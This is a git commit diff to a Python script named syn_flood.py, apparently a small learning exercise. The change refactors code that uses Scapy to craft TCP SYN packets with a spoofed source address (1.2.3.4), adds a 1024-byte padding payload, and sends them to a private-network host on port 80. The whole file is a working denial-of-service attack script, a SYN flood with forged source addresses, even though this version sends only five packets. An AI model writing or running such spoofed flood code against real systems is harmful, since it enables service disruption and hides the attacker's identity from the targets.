ba4f3cbeda0b761e69027219d84cf292bf2b35d9
Fu-Te <37261985+Fu-Te@users.noreply.github.com>
2022-03-09 22:07:32 +0900

    Update syn_flood.py

--- Python/syn_flood.py
+++ Python/syn_flood.py
@@ -1,6 +1,8 @@
 from scapy.all import *
 
+ip=IP(src='1.2.3.4',dst='192.168.1.120')
+tcp=TCP(sport=22222,dport=80,flags='S')
+raw=Raw(b'X'*1024)
 
-
-packet = IP(src='1.2.3.4',dst='192.168.1.120')/TCP(sport=22222,dport=80,flags='S')
+packet = ip/tcp/raw
 send(packet,count=5)
